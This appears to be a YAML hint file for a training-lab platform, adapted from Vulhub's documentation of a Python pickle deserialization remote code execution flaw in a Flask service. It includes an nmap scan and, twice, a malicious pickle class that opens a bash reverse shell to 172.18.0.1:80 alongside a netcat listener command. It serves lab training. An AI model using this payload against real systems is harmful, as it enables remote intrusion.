@@ -1,0 +1,105 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: python/unpickle
+hint_levels:
+  low:
+  - Inspect the python service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8000. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8000 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): flask: 8000/tcp → container 8000/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8000`.'
+  high:
+  - 'Vulnerability: Python Unpickle Deserialization Remote Code Execution.'
+  - |-
+    Vulnerability Reproduction
+
+    To exploit this vulnerability, we need to create a malicious pickle object that will execute arbitrary commands when deserialized. The exploit uses Python's `__reduce__` method to specify what function to call when the object is unpickled.
+
+    The provided exploit script (exp.py) creates a malicious pickle object that establishes a reverse shell connection to the attacker's machine:
+
+    ```python
+    class exp(object):
+        def __reduce__(self):
+            s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.18.0.1",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
+            return (os.system, (s,))
+    ```
+
+    To execute the exploit, first set up a netcat listener on your machine to receive the reverse shell:
+
+    ```
+    nc -lvp 80
+    ```
+
+    Then run the exploit script to send the malicious cookie to the vulnerable application:
+
+    ```
+    python3 exp.py
+    ```
+
+    When the server deserializes the malicious pickle object, it will execute the command and establish a reverse shell connection to your machine:
+
+    Reverse Shell Demonstration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/python/unpickle/1.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/python/unpickle/README.md'
+  - |-
+    Additional public references:
+    - http://rickgray.me/2015/09/12/django-command-execution-analysis.html
+    - https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html
+    - https://docs.python.org/3/library/pickle.html#pickle.loads
+    - https://intoli.com/blog/dangerous-pickles/
+access_instructions:
+  title: Python Unpickle Deserialization Remote Code Execution
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8000. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8000 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): flask: 8000/tcp → container 8000/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8000`.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      To exploit this vulnerability, we need to create a malicious pickle object that will execute arbitrary commands when deserialized. The exploit uses Python's `__reduce__` method to specify what function to call when the object is unpickled.
+
+      The provided exploit script (exp.py) creates a malicious pickle object that establishes a reverse shell connection to the attacker's machine:
+
+      ```python
+      class exp(object):
+          def __reduce__(self):
+              s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.18.0.1",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
+              return (os.system, (s,))
+      ```
+
+      To execute the exploit, first set up a netcat listener on your machine to receive the reverse shell:
+
+      ```
+      nc -lvp 80
+      ```
+
+      Then run the exploit script to send the malicious cookie to the vulnerable application:
+
+      ```
+      python3 exp.py
+      ```
+
+      When the server deserializes the malicious pickle object, it will execute the command and establish a reverse shell connection to your machine:
+
+      Reverse Shell Demonstration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/python/unpickle/1.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/python/unpickle/README.md
+  readme_sha256: 4878883c228b9fc1181c7a7bc614b77182da10d1f3a4713fe015e41494cd320e
+  compose_sha256: 04cc8f6a38c7c9f1cd29e2fc278455c3ea21b295c79d66a9df8a10ea949a2817
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
